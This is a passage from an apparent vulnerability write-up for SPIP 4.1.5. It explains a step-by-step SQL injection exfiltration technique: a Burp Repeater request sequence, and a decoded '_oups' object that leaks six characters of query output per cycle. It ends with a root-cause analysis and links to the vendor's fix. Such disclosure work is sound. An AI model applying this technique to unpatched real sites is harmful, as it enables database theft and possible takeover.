[![picture 6](/Abyss-W4tcher/ab4yss-wr4iteups/raw/ffa980faa9e3598d49d6fb7def4f7a67cfb5f427/SPIP%20-%20Pentest/SPIP%204.1.5/images/b6d954efef6990bc52d194ae2f192f38a66dae78da82594ab01a5de1b5afa181.png)](/Abyss-W4tcher/ab4yss-wr4iteups/blob/ffa980faa9e3598d49d6fb7def4f7a67cfb5f427/SPIP%20-%20Pentest/SPIP%204.1.5/images/b6d954efef6990bc52d194ae2f192f38a66dae78da82594ab01a5de1b5afa181.png)

* Intercept, send it to "Repeater", then **drop** it (not obligatory but it will be easier for the following)
* Go to the "Repeater" tab with the "remove author" request. Send it, and search in the response for this :

```
<input type="hidden" name="_oups" value='YToxOntpOjA7YTo2OntzOjk6ImlkX2F1dGV1ciI7czoxOiIxIjtzOjg6ImlkX29iamV0IjtzOjE6IjIiO3M6NToib2JqZXQiO3M6NzoiYXJ0aWNsZSI7czoyOiJ2dSI7czo2OiJ3ZWJtYXMiO3M6NjoiYXV0ZXVyIjtzOjE6IjEiO3M6NzoiYXJ0aWNsZSI7czoxOiIyIjt9fQ==' />
```

* What happens here, is that SPIP gives us an "\_oups" payload to cancel our author deletion if we want. The problem is that it provides the content of "spip.spip\_auteurs\_liens" for "id\_auteur = 1 AND id\_objet = 2" :

`YToxOntpOjA7YTo2OntzOjk6ImlkX2F1dGV1ciI7czoxOiIxIjtzOjg6ImlkX29iamV0IjtzOjE6IjIiO3M6NToib2JqZXQiO3M6NzoiYXJ0aWNsZSI7czoyOiJ2dSI7czo2OiJ3ZWJtYXMiO3M6NjoiYXV0ZXVyIjtzOjE6IjEiO3M6NzoiYXJ0aWNsZSI7czoxOiIyIjt9fQ==`

->

`a:1:{i:0;a:6:{s:9:"id_auteur";s:1:"1";s:8:"id_objet";s:1:"2";s:5:"objet";s:7:"article";s:2:"vu";s:6:"`**webmas**`";s:6:"auteur";s:1:"1";s:7:"article";s:1:"2";}}`

We have successfully exfiltrated 6 characters of an SQLi injection response, within 3 HTTP requests. The entry is also deleted from the table :

[![picture 7](/Abyss-W4tcher/ab4yss-wr4iteups/raw/ffa980faa9e3598d49d6fb7def4f7a67cfb5f427/SPIP%20-%20Pentest/SPIP%204.1.5/images/62fbe2630ba53820348b8cf05074d90ac6fd25c3a5c675c8f298ae2c5eb2fce6.png)](/Abyss-W4tcher/ab4yss-wr4iteups/blob/ffa980faa9e3598d49d6fb7def4f7a67cfb5f427/SPIP%20-%20Pentest/SPIP%204.1.5/images/62fbe2630ba53820348b8cf05074d90ac6fd25c3a5c675c8f298ae2c5eb2fce6.png)

You should now have a basic setup to easily try SQLi payloads :

[![picture 8](/Abyss-W4tcher/ab4yss-wr4iteups/raw/ffa980faa9e3598d49d6fb7def4f7a67cfb5f427/SPIP%20-%20Pentest/SPIP%204.1.5/images/a63e0c3eb63053a89bfe61395868100176c52c6c5b936a69c55609ab04ef86f9.png)](/Abyss-W4tcher/ab4yss-wr4iteups/blob/ffa980faa9e3598d49d6fb7def4f7a67cfb5f427/SPIP%20-%20Pentest/SPIP%204.1.5/images/a63e0c3eb63053a89bfe61395868100176c52c6c5b936a69c55609ab04ef86f9.png)

* 24 -> "add author" // no need to change it
* 23 -> "POST SQLi payload" // change the base64 payload here as you want
* 22 -> "remove author" // no need to change it

If executed in this order, you should be able to have a simple automation.

To resume :

* Associate an author to an article we created
* Send the SQLi payload to insert arbitrary content inside the "vu" column
* Remove the author from the article, and inspect the "\_oups" object provided by SPIP in response
* The object is a backup from a specific line of the table, the one with our "vu" column containing the SQLi response

All of this should be automated with a script, so that we only have to change our SQLi payload in a variable, launch the script and retrieve the output. It is important to notice that we'll only get 6 characters for each procedure.

Either we need to determine prealably the size of the response, to know how many loops will be needed to exfiltrate its content, or by an equivalent technique.

With a little bit of craziness, it may even be possible to make it work with SQLMAP :).

## Conclusion

It seems that this SQL injection was present in the code for a long time, even before the first [fix](https://github.com/spip/SPIP/commit/0394b44774555ae8331b6e65e35065dfa0bb41e4#diff-5acee332f654b65c66c03397e868febdcd7f345d96d0172fede602763da990d0L224) back in 2020. The way that the "\_oups" JSON/PHP object is deserialized/unserialized is not really secure. In fact, we can add arbitrary keys to the dictionnary, and have them injected in the SQL requests without filtering.

There are no checks to accept only a specified set of defined keys ("objet", "id\_auteur" etc.). It is as if a PHP code was extracting every GET parameter (e.g. `foreach($_GET as $key => $value)`) and inserting them in an SQL query.

We won't explain how it is possible to elevate this SQLi to an account takeover or RCE, but there are vectors to do it.

To conclude, we would say that the "Ooops" function must be **deleted**. Indeed, if we miss clicked and removed an author from our article, we can just click on "Add author" and add him back. We have one more click to do, but with the advantage of eradicating once and for all this dangerous code (exploited three times in two years to achieve RCE and SQLi).

## Security fixes

New release : <https://blog.spip.net/Mise-a-jour-de-securite-sortie-de-SPIP-4-1-7-SPIP-4-0-9-et-SPIP-3-2-17.html>

Patch : <https://github.com/spip/SPIP/commit/07695e6f35ddc585d27358bc41b71d0ff0b654f7>

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


